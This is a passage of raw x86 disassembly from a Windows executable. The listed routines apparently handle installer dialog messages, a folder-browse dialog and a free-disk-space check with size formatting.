  40496f:	ff 15 58 82 40 00    	call   *0x408258
  404975:	c3                   	ret
  404976:	55                   	push   %ebp
  404977:	8b ec                	mov    %esp,%ebp
  404979:	83 ec 3c             	sub    $0x3c,%esp
  40497c:	8b 45 08             	mov    0x8(%ebp),%eax
  40497f:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  404983:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  404987:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40498a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40498d:	c7 45 c8 00 05 00 00 	movl   $0x500,-0x38(%ebp)
  404994:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404997:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40499a:	50                   	push   %eax
  40499b:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  4049a2:	c7 45 d0 8c a3 40 00 	movl   $0x40a38c,-0x30(%ebp)
  4049a9:	e8 01 12 00 00       	call   0x405baf
  4049ae:	c9                   	leave
  4049af:	c2 0c 00             	ret    $0xc
  4049b2:	55                   	push   %ebp
  4049b3:	8b ec                	mov    %esp,%ebp
  4049b5:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4049bc:	56                   	push   %esi
  4049bd:	8b 75 14             	mov    0x14(%ebp),%esi
  4049c0:	75 26                	jne    0x4049e8
  4049c2:	ff 76 30             	push   0x30(%esi)
  4049c5:	6a 1d                	push   $0x1d
  4049c7:	ff 75 08             	push   0x8(%ebp)
  4049ca:	e8 39 fb ff ff       	call   0x404508
  4049cf:	8b 46 3c             	mov    0x3c(%esi),%eax
  4049d2:	c1 e0 0b             	shl    $0xb,%eax
  4049d5:	05 00 a0 42 00       	add    $0x42a000,%eax
  4049da:	50                   	push   %eax
  4049db:	68 e8 03 00 00       	push   $0x3e8
  4049e0:	ff 75 08             	push   0x8(%ebp)
  4049e3:	e8 df 11 00 00       	call   0x405bc7
  4049e8:	56                   	push   %esi
  4049e9:	ff 75 10             	push   0x10(%ebp)
  4049ec:	ff 75 0c             	push   0xc(%ebp)
  4049ef:	e8 7b fb ff ff       	call   0x40456f
  4049f4:	5e                   	pop    %esi
  4049f5:	5d                   	pop    %ebp
  4049f6:	c2 10 00             	ret    $0x10
  4049f9:	55                   	push   %ebp
  4049fa:	8b ec                	mov    %esp,%ebp
  4049fc:	83 ec 4c             	sub    $0x4c,%esp
  4049ff:	a1 e0 1e 42 00       	mov    0x421ee0,%eax
  404a04:	53                   	push   %ebx
  404a05:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404a08:	56                   	push   %esi
  404a09:	8b 58 3c             	mov    0x3c(%eax),%ebx
  404a0c:	8b 40 38             	mov    0x38(%eax),%eax
  404a0f:	c1 e3 0b             	shl    $0xb,%ebx
  404a12:	81 c3 00 a0 42 00    	add    $0x42a000,%ebx
  404a18:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404a1f:	57                   	push   %edi
  404a20:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404a23:	75 11                	jne    0x404a36
  404a25:	53                   	push   %ebx
  404a26:	68 fb 03 00 00       	push   $0x3fb
  404a2b:	e8 9d 11 00 00       	call   0x405bcd
  404a30:	53                   	push   %ebx
  404a31:	e8 01 1e 00 00       	call   0x406837
  404a36:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404a3d:	8b 75 08             	mov    0x8(%ebp),%esi
  404a40:	75 6c                	jne    0x404aae
  404a42:	68 fb 03 00 00       	push   $0x3fb
  404a47:	56                   	push   %esi
  404a48:	ff 15 3c 82 40 00    	call   *0x40823c
  404a4e:	53                   	push   %ebx
  404a4f:	8b f8                	mov    %eax,%edi
  404a51:	e8 79 14 00 00       	call   0x405ecf
  404a56:	85 c0                	test   %eax,%eax
  404a58:	74 10                	je     0x404a6a
  404a5a:	53                   	push   %ebx
  404a5b:	e8 a3 14 00 00       	call   0x405f03
  404a60:	85 c0                	test   %eax,%eax
  404a62:	75 06                	jne    0x404a6a
  404a64:	53                   	push   %ebx
  404a65:	e8 ee 13 00 00       	call   0x405e58
  404a6a:	53                   	push   %ebx
  404a6b:	57                   	push   %edi
  404a6c:	89 35 f8 89 42 00    	mov    %esi,0x4289f8
  404a72:	ff 15 1c 82 40 00    	call   *0x40821c
  404a78:	8b 45 14             	mov    0x14(%ebp),%eax
  404a7b:	ff 70 34             	push   0x34(%eax)
  404a7e:	6a 01                	push   $0x1
  404a80:	56                   	push   %esi
  404a81:	e8 82 fa ff ff       	call   0x404508
  404a86:	8b 45 14             	mov    0x14(%ebp),%eax
  404a89:	ff 70 30             	push   0x30(%eax)
  404a8c:	6a 14                	push   $0x14
  404a8e:	56                   	push   %esi
  404a8f:	e8 74 fa ff ff       	call   0x404508
  404a94:	57                   	push   %edi
  404a95:	e8 a3 fa ff ff       	call   0x40453d
  404a9a:	6a 09                	push   $0x9
  404a9c:	e8 dc 1e 00 00       	call   0x40697d
  404aa1:	85 c0                	test   %eax,%eax
  404aa3:	0f 84 91 02 00 00    	je     0x404d3a
  404aa9:	6a 01                	push   $0x1
  404aab:	57                   	push   %edi
  404aac:	ff d0                	call   *%eax
  404aae:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404ab5:	0f 85 d1 00 00 00    	jne    0x404b8c
  404abb:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  404abf:	3d fb 03 00 00       	cmp    $0x3fb,%eax
  404ac4:	75 18                	jne    0x404ade
  404ac6:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404ac9:	c1 e9 10             	shr    $0x10,%ecx
  404acc:	66 81 f9 00 03       	cmp    $0x300,%cx
  404ad1:	0f 85 63 02 00 00    	jne    0x404d3a
  404ad7:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404ade:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  404ae3:	0f 85 a3 00 00 00    	jne    0x404b8c
  404ae9:	6a 07                	push   $0x7
  404aeb:	33 c0                	xor    %eax,%eax
  404aed:	59                   	pop    %ecx
  404aee:	8d 7d b8             	lea    -0x48(%ebp),%edi
  404af1:	ff 75 f8             	push   -0x8(%ebp)
  404af4:	f3 ab                	rep stos %eax,%es:(%edi)
  404af6:	bf 08 2f 42 00       	mov    $0x422f08,%edi
  404afb:	68 e0 16 42 00       	push   $0x4216e0
  404b00:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  404b03:	89 7d bc             	mov    %edi,-0x44(%ebp)
  404b06:	c7 45 c8 4f 4d 40 00 	movl   $0x404d4f,-0x38(%ebp)
  404b0d:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  404b10:	e8 b1 1a 00 00       	call   0x4065c6
  404b15:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404b18:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404b1b:	50                   	push   %eax
  404b1c:	c7 45 c4 41 00 00 00 	movl   $0x41,-0x3c(%ebp)
  404b23:	ff 15 78 81 40 00    	call   *0x408178
  404b29:	85 c0                	test   %eax,%eax
  404b2b:	74 58                	je     0x404b85
  404b2d:	50                   	push   %eax
  404b2e:	ff 15 a0 82 40 00    	call   *0x4082a0
  404b34:	53                   	push   %ebx
  404b35:	e8 1e 13 00 00       	call   0x405e58
  404b3a:	a1 30 9a 42 00       	mov    0x429a30,%eax
  404b3f:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  404b45:	85 c0                	test   %eax,%eax
  404b47:	74 28                	je     0x404b71
  404b49:	81 fb 00 48 43 00    	cmp    $0x434800,%ebx
  404b4f:	75 20                	jne    0x404b71
  404b51:	50                   	push   %eax
  404b52:	6a 00                	push   $0x0
  404b54:	e8 6d 1a 00 00       	call   0x4065c6
  404b59:	57                   	push   %edi
  404b5a:	bf c0 79 42 00       	mov    $0x4279c0,%edi
  404b5f:	57                   	push   %edi
  404b60:	ff 15 00 81 40 00    	call   *0x408100
  404b66:	85 c0                	test   %eax,%eax
  404b68:	74 07                	je     0x404b71
  404b6a:	57                   	push   %edi
  404b6b:	53                   	push   %ebx
  404b6c:	e8 34 1a 00 00       	call   0x4065a5
  404b71:	ff 05 f8 2e 42 00    	incl   0x422ef8
  404b77:	53                   	push   %ebx
  404b78:	68 fb 03 00 00       	push   $0x3fb
  404b7d:	56                   	push   %esi
  404b7e:	e8 44 10 00 00       	call   0x405bc7
  404b83:	eb 07                	jmp    0x404b8c
  404b85:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404b8c:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404b93:	74 0d                	je     0x404ba2
  404b95:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404b9c:	0f 85 98 01 00 00    	jne    0x404d3a
  404ba2:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404ba6:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404baa:	53                   	push   %ebx
  404bab:	68 fb 03 00 00       	push   $0x3fb
  404bb0:	e8 18 10 00 00       	call   0x405bcd
  404bb5:	53                   	push   %ebx
  404bb6:	e8 a5 13 00 00       	call   0x405f60
  404bbb:	85 c0                	test   %eax,%eax
  404bbd:	75 07                	jne    0x404bc6
  404bbf:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  404bc6:	be d8 0e 42 00       	mov    $0x420ed8,%esi
  404bcb:	53                   	push   %ebx
  404bcc:	56                   	push   %esi
  404bcd:	e8 b7 19 00 00       	call   0x406589
  404bd2:	6a 01                	push   $0x1
  404bd4:	e8 a4 1d 00 00       	call   0x40697d
  404bd9:	85 c0                	test   %eax,%eax
  404bdb:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404bde:	74 3a                	je     0x404c1a
  404be0:	33 c0                	xor    %eax,%eax
  404be2:	33 ff                	xor    %edi,%edi
  404be4:	3b c6                	cmp    %esi,%eax
  404be6:	74 32                	je     0x404c1a
  404be8:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404beb:	50                   	push   %eax
  404bec:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404bef:	50                   	push   %eax
  404bf0:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404bf3:	50                   	push   %eax
  404bf4:	56                   	push   %esi
  404bf5:	ff 55 f4             	call   *-0xc(%ebp)
  404bf8:	85 c0                	test   %eax,%eax
  404bfa:	75 76                	jne    0x404c72
  404bfc:	85 ff                	test   %edi,%edi
  404bfe:	74 03                	je     0x404c03
  404c00:	66 21 07             	and    %ax,(%edi)
  404c03:	56                   	push   %esi
  404c04:	e8 9b 12 00 00       	call   0x405ea4
  404c09:	8b f8                	mov    %eax,%edi
  404c0b:	66 83 27 00          	andw   $0x0,(%edi)
  404c0f:	4f                   	dec    %edi
  404c10:	4f                   	dec    %edi
  404c11:	3b fe                	cmp    %esi,%edi
  404c13:	66 c7 07 5c 00       	movw   $0x5c,(%edi)
  404c18:	75 ce                	jne    0x404be8
  404c1a:	53                   	push   %ebx
  404c1b:	56                   	push   %esi
  404c1c:	e8 68 19 00 00       	call   0x406589
  404c21:	56                   	push   %esi
  404c22:	e8 dc 12 00 00       	call   0x405f03
  404c27:	33 ff                	xor    %edi,%edi
  404c29:	3b c7                	cmp    %edi,%eax
  404c2b:	74 03                	je     0x404c30
  404c2d:	66 89 38             	mov    %di,(%eax)
  404c30:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404c33:	50                   	push   %eax
  404c34:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404c37:	50                   	push   %eax
  404c38:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404c3b:	50                   	push   %eax
  404c3c:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404c3f:	50                   	push   %eax
  404c40:	56                   	push   %esi
  404c41:	ff 15 90 80 40 00    	call   *0x408090
  404c47:	85 c0                	test   %eax,%eax
  404c49:	74 43                	je     0x404c8e
  404c4b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404c4e:	be 00 04 00 00       	mov    $0x400,%esi
  404c53:	0f af 45 ec          	imul   -0x14(%ebp),%eax
  404c57:	56                   	push   %esi
  404c58:	ff 75 f4             	push   -0xc(%ebp)
  404c5b:	50                   	push   %eax
  404c5c:	ff 15 48 81 40 00    	call   *0x408148
  404c62:	99                   	cltd
  404c63:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404c66:	89 55 d8             	mov    %edx,-0x28(%ebp)
  404c69:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404c70:	eb 21                	jmp    0x404c93
  404c72:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404c75:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  404c78:	0f ac c8 0a          	shrd   $0xa,%ecx,%eax
  404c7c:	c1 e9 0a             	shr    $0xa,%ecx
  404c7f:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404c82:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  404c85:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404c8c:	33 ff                	xor    %edi,%edi
  404c8e:	be 00 04 00 00       	mov    $0x400,%esi
  404c93:	6a 05                	push   $0x5
  404c95:	e8 fc 01 00 00       	call   0x404e96
  404c9a:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404c9d:	74 19                	je     0x404cb8
  404c9f:	8b 55 d8             	mov    -0x28(%ebp),%edx
  404ca2:	33 c9                	xor    %ecx,%ecx
  404ca4:	3b d1                	cmp    %ecx,%edx
  404ca6:	77 10                	ja     0x404cb8
  404ca8:	72 07                	jb     0x404cb1
  404caa:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  404cad:	3b c8                	cmp    %eax,%ecx
  404caf:	73 07                	jae    0x404cb8
  404cb1:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  404cb8:	8b 0d fc 89 42 00    	mov    0x4289fc,%ecx
  404cbe:	39 79 10             	cmp    %edi,0x10(%ecx)
  404cc1:	74 30                	je     0x404cf3
  404cc3:	50                   	push   %eax
  404cc4:	6a fb                	push   $0xfffffffb
  404cc6:	68 ff 03 00 00       	push   $0x3ff
  404ccb:	e8 ae 01 00 00       	call   0x404e7e
  404cd0:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404cd3:	74 10                	je     0x404ce5
  404cd5:	ff 75 d8             	push   -0x28(%ebp)
  404cd8:	ff 75 d4             	push   -0x2c(%ebp)
  404cdb:	6a fc                	push   $0xfffffffc
  404cdd:	56                   	push   %esi
  404cde:	e8 d2 00 00 00       	call   0x404db5
  404ce3:	eb 0e                	jmp    0x404cf3
  404ce5:	68 c8 0e 42 00       	push   $0x420ec8
  404cea:	56                   	push   %esi
  404ceb:	ff 75 08             	push   0x8(%ebp)
  404cee:	e8 d4 0e 00 00       	call   0x405bc7
  404cf3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404cf6:	3b c7                	cmp    %edi,%eax
  404cf8:	a3 c4 9a 42 00       	mov    %eax,0x429ac4
  404cfd:	75 0a                	jne    0x404d09
  404cff:	6a 07                	push   $0x7
  404d01:	e8 05 c7 ff ff       	call   0x40140b
  404d06:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404d09:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404d0c:	85 70 14             	test   %esi,0x14(%eax)
  404d0f:	74 03                	je     0x404d14
  404d11:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404d14:	33 c0                	xor    %eax,%eax
  404d16:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404d19:	0f 94 c0             	sete   %al
  404d1c:	50                   	push   %eax
  404d1d:	e8 08 f8 ff ff       	call   0x40452a
  404d22:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404d25:	75 0d                	jne    0x404d34
  404d27:	39 3d f8 2e 42 00    	cmp    %edi,0x422ef8
  404d2d:	75 05                	jne    0x404d34
  404d2f:	e8 1e fc ff ff       	call   0x404952
  404d34:	89 3d f8 2e 42 00    	mov    %edi,0x422ef8
  404d3a:	ff 75 14             	push   0x14(%ebp)
  404d3d:	ff 75 10             	push   0x10(%ebp)
  404d40:	ff 75 0c             	push   0xc(%ebp)
  404d43:	e8 27 f8 ff ff       	call   0x40456f
  404d48:	5f                   	pop    %edi
  404d49:	5e                   	pop    %esi
  404d4a:	5b                   	pop    %ebx
  404d4b:	c9                   	leave
  404d4c:	c2 10 00             	ret    $0x10
  404d4f:	55                   	push   %ebp
  404d50:	8b ec                	mov    %esp,%ebp
  404d52:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  404d56:	56                   	push   %esi
  404d57:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404d5d:	75 1c                	jne    0x404d7b
  404d5f:	ff 75 14             	push   0x14(%ebp)
  404d62:	68 fb 03 00 00       	push   $0x3fb
  404d67:	e8 61 0e 00 00       	call   0x405bcd
  404d6c:	ff 75 14             	push   0x14(%ebp)
  404d6f:	6a 01                	push   $0x1
  404d71:	68 67 04 00 00       	push   $0x467
  404d76:	ff 75 08             	push   0x8(%ebp)
  404d79:	ff d6                	call   *%esi
  404d7b:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  404d7f:	75 2d                	jne    0x404dae
  404d81:	ff 75 14             	push   0x14(%ebp)
  404d84:	ff 75 10             	push   0x10(%ebp)
  404d87:	ff 15 74 81 40 00    	call   *0x408174
  404d8d:	85 c0                	test   %eax,%eax
  404d8f:	74 0e                	je     0x404d9f
  404d91:	6a 07                	push   $0x7
  404d93:	e8 73 c6 ff ff       	call   0x40140b
  404d98:	85 c0                	test   %eax,%eax
  404d9a:	75 03                	jne    0x404d9f
  404d9c:	40                   	inc    %eax
  404d9d:	eb 02                	jmp    0x404da1
  404d9f:	33 c0                	xor    %eax,%eax
  404da1:	50                   	push   %eax
  404da2:	6a 00                	push   $0x0
  404da4:	68 65 04 00 00       	push   $0x465
  404da9:	ff 75 08             	push   0x8(%ebp)
  404dac:	ff d6                	call   *%esi
  404dae:	33 c0                	xor    %eax,%eax
  404db0:	5e                   	pop    %esi
  404db1:	5d                   	pop    %ebp
  404db2:	c2 10 00             	ret    $0x10
  404db5:	55                   	push   %ebp
  404db6:	8b ec                	mov    %esp,%ebp
  404db8:	81 ec 80 00 00 00    	sub    $0x80,%esp
  404dbe:	8b 45 14             	mov    0x14(%ebp),%eax
  404dc1:	53                   	push   %ebx
  404dc2:	56                   	push   %esi
  404dc3:	8b 75 10             	mov    0x10(%ebp),%esi
  404dc6:	57                   	push   %edi
  404dc7:	6a dc                	push   $0xffffffdc
  404dc9:	85 c0                	test   %eax,%eax
  404dcb:	5b                   	pop    %ebx
  404dcc:	74 0b                	je     0x404dd9
  404dce:	0f ac c6 14          	shrd   $0x14,%eax,%esi
  404dd2:	c1 e8 14             	shr    $0x14,%eax
  404dd5:	33 ff                	xor    %edi,%edi
  404dd7:	eb 4e                	jmp    0x404e27
  404dd9:	6a 14                	push   $0x14
  404ddb:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  404de1:	59                   	pop    %ecx
  404de2:	8b c6                	mov    %esi,%eax
  404de4:	73 06                	jae    0x404dec
  404de6:	6a 0a                	push   $0xa
  404de8:	59                   	pop    %ecx
  404de9:	6a dd                	push   $0xffffffdd
  404deb:	5b                   	pop    %ebx
  404dec:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  404df2:	73 05                	jae    0x404df9
  404df4:	6a de                	push   $0xffffffde
  404df6:	33 c9                	xor    %ecx,%ecx
  404df8:	5b                   	pop    %ebx
  404df9:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  404dff:	73 0d                	jae    0x404e0e
  404e01:	33 c0                	xor    %eax,%eax
  404e03:	6a 14                	push   $0x14
  404e05:	40                   	inc    %eax
  404e06:	5f                   	pop    %edi
  404e07:	d3 e0                	shl    %cl,%eax
  404e09:	99                   	cltd
  404e0a:	f7 ff                	idiv   %edi
  404e0c:	03 c6                	add    %esi,%eax
  404e0e:	8b f0                	mov    %eax,%esi
  404e10:	25 ff ff ff 00       	and    $0xffffff,%eax
  404e15:	6a 0a                	push   $0xa
  404e17:	33 d2                	xor    %edx,%edx
  404e19:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404e1c:	03 c0                	add    %eax,%eax
  404e1e:	d3 e8                	shr    %cl,%eax
  404e20:	d3 ee                	shr    %cl,%esi
  404e22:	59                   	pop    %ecx
  404e23:	f7 f1                	div    %ecx
  404e25:	8b fa                	mov    %edx,%edi
  404e27:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404e2a:	6a df                	push   $0xffffffdf
  404e2c:	50                   	push   %eax
  404e2d:	e8 94 17 00 00       	call   0x4065c6
  404e32:	50                   	push   %eax
  404e33:	8d 45 80             	lea    -0x80(%ebp),%eax
  404e36:	53                   	push   %ebx
  404e37:	50                   	push   %eax
  404e38:	e8 89 17 00 00       	call   0x4065c6
  404e3d:	50                   	push   %eax
  404e3e:	57                   	push   %edi
  404e3f:	56                   	push   %esi
  404e40:	68 98 a3 40 00       	push   $0x40a398
  404e45:	ff 75 0c             	push   0xc(%ebp)
  404e48:	be 08 2f 42 00       	mov    $0x422f08,%esi
  404e4d:	56                   	push   %esi
  404e4e:	e8 73 17 00 00       	call   0x4065c6
  404e53:	56                   	push   %esi
  404e54:	8b f8                	mov    %eax,%edi
  404e56:	e8 44 17 00 00       	call   0x40659f
  404e5b:	8d 04 47             	lea    (%edi,%eax,2),%eax
  404e5e:	50                   	push   %eax
  404e5f:	ff 15 2c 82 40 00    	call   *0x40822c
  404e65:	83 c4 18             	add    $0x18,%esp
  404e68:	56                   	push   %esi
  404e69:	ff 75 08             	push   0x8(%ebp)
  404e6c:	ff 35 f8 89 42 00    	push   0x4289f8
  404e72:	e8 50 0d 00 00       	call   0x405bc7
  404e77:	5f                   	pop    %edi
  404e78:	5e                   	pop    %esi
  404e79:	5b                   	pop    %ebx
  404e7a:	c9                   	leave
  404e7b:	c2 10 00             	ret    $0x10
  404e7e:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404e82:	33 c9                	xor    %ecx,%ecx
  404e84:	51                   	push   %ecx
  404e85:	50                   	push   %eax
  404e86:	ff 74 24 10          	push   0x10(%esp)
  404e8a:	ff 74 24 10          	push   0x10(%esp)
  404e8e:	e8 22 ff ff ff       	call   0x404db5
  404e93:	c2 0c 00             	ret    $0xc
  404e96:	8b 15 4c 9a 42 00    	mov    0x429a4c,%edx
  404e9c:	8b 0d 48 9a 42 00    	mov    0x429a48,%ecx
  404ea2:	33 c0                	xor    %eax,%eax
  404ea4:	85 d2                	test   %edx,%edx
  404ea6:	74 18                	je     0x404ec0
  404ea8:	56                   	push   %esi
  404ea9:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  404ead:	74 07                	je     0x404eb6
  404eaf:	8b 74 24 08          	mov    0x8(%esp),%esi
  404eb3:	03 04 b1             	add    (%ecx,%esi,4),%eax
  404eb6:	81 c1 18 08 00 00    	add    $0x818,%ecx
  404ebc:	4a                   	dec    %edx
  404ebd:	75 ea                	jne    0x404ea9
  404ebf:	5e                   	pop    %esi
  404ec0:	c2 04 00             	ret    $0x4
  404ec3:	55                   	push   %ebp
  404ec4:	8b ec                	mov    %esp,%ebp
  404ec6:	83 ec 38             	sub    $0x38,%esp
  404ec9:	56                   	push   %esi
  404eca:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404ed0:	57                   	push   %edi
  404ed1:	8b 7d 08             	mov    0x8(%ebp),%edi
  404ed4:	6a 00                	push   $0x0
  404ed6:	6a 09                	push   $0x9
  404ed8:	68 0a 11 00 00       	push   $0x110a
  404edd:	57                   	push   %edi
  404ede:	ff d6                	call   *%esi
  404ee0:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  404ee4:	74 3c                	je     0x404f22
  404ee6:	ff 15 bc 81 40 00    	call   *0x4081bc
  404eec:	0f bf c8             	movswl %ax,%ecx
  404eef:	c1 e8 10             	shr    $0x10,%eax
  404ef2:	0f bf c0             	movswl %ax,%eax
  404ef5:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404ef8:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404efb:	50                   	push   %eax
  404efc:	57                   	push   %edi
  404efd:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404f00:	ff 15 ec 81 40 00    	call   *0x4081ec
  404f06:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404f09:	50                   	push   %eax
  404f0a:	6a 00                	push   $0x0
  404f0c:	68 11 11 00 00       	push   $0x1111
  404f11:	57                   	push   %edi
  404f12:	ff d6                	call   *%esi
  404f14:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  404f18:	75 05                	jne    0x404f1f
  404f1a:	83 c8 ff             	or     $0xffffffff,%eax
  404f1d:	eb 1e                	jmp    0x404f3d
  404f1f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404f22:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404f25:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404f28:	50                   	push   %eax
  404f29:	6a 00                	push   $0x0
  404f2b:	68 3e 11 00 00       	push   $0x113e
  404f30:	57                   	push   %edi
  404f31:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  404f38:	ff d6                	call   *%esi
  404f3a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404f3d:	5f                   	pop    %edi
  404f3e:	5e                   	pop    %esi
  404f3f:	c9                   	leave
  404f40:	c2 08 00             	ret    $0x8
  404f43:	56                   	push   %esi
  404f44:	57                   	push   %edi
  404f45:	be 00 a0 42 00       	mov    $0x42a000,%esi
  404f4a:	bf 08 2f 42 00       	mov    $0x422f08,%edi
  404f4f:	56                   	push   %esi
  404f50:	57                   	push   %edi
  404f51:	e8 33 16 00 00       	call   0x406589
  404f56:	ff 74 24 10          	push   0x10(%esp)
  404f5a:	56                   	push   %esi
  404f5b:	e8 70 15 00 00       	call   0x4064d0
  404f60:	ff 74 24 0c          	push   0xc(%esp)
  404f64:	e8 a2 c4 ff ff       	call   0x40140b
  404f69:	57                   	push   %edi
  404f6a:	56                   	push   %esi
  404f6b:	e8 19 16 00 00       	call   0x406589
  404f70:	5f                   	pop    %edi
  404f71:	5e                   	pop    %esi
  404f72:	c2 08 00             	ret    $0x8
  404f75:	55                   	push   %ebp
  404f76:	8b ec                	mov    %esp,%ebp
  404f78:	83 ec 54             	sub    $0x54,%esp
  404f7b:	53                   	push   %ebx
  404f7c:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404f7f:	56                   	push   %esi
  404f80:	8b 35 3c 82 40 00    	mov    0x40823c,%esi
  404f86:	57                   	push   %edi
  404f87:	68 f9 03 00 00       	push   $0x3f9
  404f8c:	53                   	push   %ebx
  404f8d:	ff d6                	call   *%esi
  404f8f:	68 08 04 00 00       	push   $0x408
  404f94:	53                   	push   %ebx
  404f95:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404f98:	ff d6                	call   *%esi
  404f9a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404f9d:	a1 48 9a 42 00       	mov    0x429a48,%eax
  404fa2:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404fa8:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404fab:	a1 30 9a 42 00       	mov    0x429a30,%eax
  404fb0:	33 ff                	xor    %edi,%edi
  404fb2:	05 94 00 00 00       	add    $0x94,%eax
  404fb7:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404fbe:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404fc1:	0f 85 25 02 00 00    	jne    0x4051ec
  404fc7:	a1 4c 9a 42 00       	mov    0x429a4c,%eax
  404fcc:	89 7d e0             	mov    %edi,-0x20(%ebp)
  404fcf:	c1 e0 02             	shl    $0x2,%eax
  404fd2:	50                   	push   %eax
  404fd3:	6a 40                	push   $0x40
  404fd5:	c7 45 f0 02 00 00 00 	movl   $0x2,-0x10(%ebp)
  404fdc:	89 1d 80 9a 42 00    	mov    %ebx,0x429a80
  404fe2:	ff 15 10 81 40 00    	call   *0x408110
  404fe8:	57                   	push   %edi
  404fe9:	57                   	push   %edi
  404fea:	57                   	push   %edi
  404feb:	57                   	push   %edi
  404fec:	6a 6e                	push   $0x6e
  404fee:	a3 00 2f 42 00       	mov    %eax,0x422f00
  404ff3:	ff 35 20 9a 42 00    	push   0x429a20
  404ff9:	ff 15 44 82 40 00    	call   *0x408244
  404fff:	83 0d f4 2e 42 00 ff 	orl    $0xffffffff,0x422ef4
  405006:	68 82 55 40 00       	push   $0x405582
  40500b:	6a fc                	push   $0xfffffffc
  40500d:	8b d8                	mov    %eax,%ebx
  40500f:	ff 75 fc             	push   -0x4(%ebp)
  405012:	ff 15 40 82 40 00    	call   *0x408240
  405018:	57                   	push   %edi
  405019:	6a 06                	push   $0x6
  40501b:	6a 21                	push   $0x21
  40501d:	6a 10                	push   $0x10
  40501f:	6a 10                	push   $0x10
  405021:	a3 fc 2e 42 00       	mov    %eax,0x422efc
  405026:	ff 15 40 80 40 00    	call   *0x408040
  40502c:	68 ff 00 ff 00       	push   $0xff00ff
  405031:	53                   	push   %ebx
  405032:	50                   	push   %eax
  405033:	a3 ec 2e 42 00       	mov    %eax,0x422eec
  405038:	ff 15 3c 80 40 00    	call   *0x40803c
  40503e:	ff 35 ec 2e 42 00    	push   0x422eec
  405044:	6a 02                	push   $0x2
  405046:	68 09 11 00 00       	push   $0x1109
  40504b:	ff 75 fc             	push   -0x4(%ebp)
  40504e:	ff d6                	call   *%esi
  405050:	57                   	push   %edi
